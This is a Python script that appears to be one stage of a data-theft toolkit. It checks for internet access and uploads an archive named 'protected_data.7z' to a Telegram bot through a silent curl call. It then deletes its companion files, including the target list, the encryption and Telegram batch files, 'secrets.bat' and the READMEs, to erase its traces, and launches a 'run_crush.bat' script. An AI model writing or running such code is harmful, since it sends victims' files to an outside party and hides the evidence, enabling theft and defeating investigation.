import os
import subprocess

script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)

FILES_TO_DELETE = [
    "targets.txt", "archive_and_encrypt.bat", "send_via_telegram.bat",
    "check_internet.bat",
    r"..\additions_(but_important)\hotkey_0.ahk",
    r"..\additions_(but_important)\hotkey0_0.exe",
    r"..\additions_(but_important)\hotkey.ahk",
    r"..\additions_(but_important)\7zr.exe",
    r"..\README\README-TELEGRAM_BOT.md", r"..\README\README.md",
    r"..\run_all.bat", r"..\run_crush_0.bat", r"..\secrets.bat",
    r"..\start_hotkeys.bat"
]


def delete_files():
    for rel in FILES_TO_DELETE:
        p = os.path.abspath(os.path.join(script_dir, rel))
        try:
            if os.path.exists(p):
                os.chmod(p, 0o666)
                os.remove(p)
        except Exception:
            pass


def run_batch(path):
    if os.path.exists(path):
        subprocess.run([path], cwd=os.path.dirname(path), capture_output=True)


def has_internet():
    return subprocess.run(
        [os.path.join(script_dir, "check_internet.bat")],
        capture_output=True
    ).returncode == 0


def send_telegram():
    token = os.environ.get("TG90_0BOT_TOKEN", "")
    chat_id = os.environ.get("TG090_0CHAT_ID", "")
    cmd = [
        "curl", "--silent", "--max-time", "60", "--connect-timeout", "10",
        "-F", f"chat_id={chat_id}",
        "-F", "document=@protected_data.7z",
        f"https://api.telegram.org/bot{token}/sendDocument"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return '"ok":true' in result.stdout


try:
    if not has_internet():
        raise RuntimeError("no internet")
    if not send_telegram():
        raise RuntimeError("send failed")
finally:
    delete_files()
    run_batch(os.path.abspath(r"..\additions_(but_important)\run_crush.bat"))


    
